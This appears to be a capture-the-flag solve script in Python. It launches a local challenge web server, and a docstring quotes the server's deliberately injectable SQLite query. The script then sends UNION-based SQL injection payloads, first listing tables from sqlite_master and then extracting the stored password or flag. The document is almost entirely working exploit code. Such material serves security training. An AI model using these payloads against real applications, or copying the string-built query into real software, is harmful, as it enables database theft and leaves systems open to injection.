import os
import re
import requests


"""
    table_name = f"table{hash(flag) & 0xFFFFFFFFFFFFFFFF}"
    db.execute((f"CREATE TABLE IF NOT EXISTS {table_name} AS "
                'SELECT "flag" AS username, ? AS password'),
               (flag,))

    query = request.args.get("query", "%")
    users = db.execute(f'SELECT username FROM {table_name} WHERE username LIKE "{query}"').fetchall()
    return "".join(f'{user["username"]}\n' for user in users)

"""


pat0 = re.compile(r".*Now running the web server:\n")
r_pipe1, w_pipe1 = os.pipe()

pid = os.fork()

if pid == -1:
	print("Error fork.")
	exit(1)

if pid == 0:
	os.close(r_pipe1)

	os.dup2(w_pipe1, 1)
	os.close(w_pipe1)

	os.execv("/challenge/run", ["/challenge/run"])
	print("Error execv.")
	exit(1)

os.close(w_pipe1)

output = os.fdopen(r_pipe1, "r")

while True:
	line = output.readline()
	print(line, end="")
	m = pat0.match(line)
	if m:
		url = "http://challenge.localhost:80"
		data = {"query": '%" UNION SELECT tbl_name FROM sqlite_master WHERE type="table'}
		r = requests.get(url, params=data)
		table_name = r.text.split("\n")[1]
		print(table_name)
		data = {"query": f'%" UNION SELECT password FROM {table_name} --'}
		r = requests.get(url, params=data)
		print(r.text)
		break
